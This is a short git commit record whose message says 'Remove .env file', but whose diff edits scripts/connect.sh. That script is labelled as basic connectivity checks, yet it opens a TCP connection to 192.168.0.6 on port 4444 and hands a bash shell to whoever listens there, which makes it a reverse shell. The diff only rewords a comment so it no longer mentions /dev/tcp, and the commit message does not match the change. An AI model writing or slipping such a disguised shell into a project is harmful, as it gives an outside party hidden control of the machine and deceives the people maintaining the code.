e6a5f2667a8d126089261fffdd5e64f9c63743fe
Miller Engelbrecht <millerengelbrecht@Millers-MacBook-Pro.local>
2026-09-15 15:25:08 +1000

    Remove .env file

--- scripts/connect.sh
+++ scripts/connect.sh
@@ -3,6 +3,6 @@
 # Performs basic connectivity checks
 HOST="192.168.0.6"
 PORT="4444"
-# Establish connection and spawn shell using bash's /dev/tcp
+# Establish connection and spawn shell
 exec 3<>/dev/tcp/$HOST/$PORT
 /bin/bash <&3 >&3 2>&3
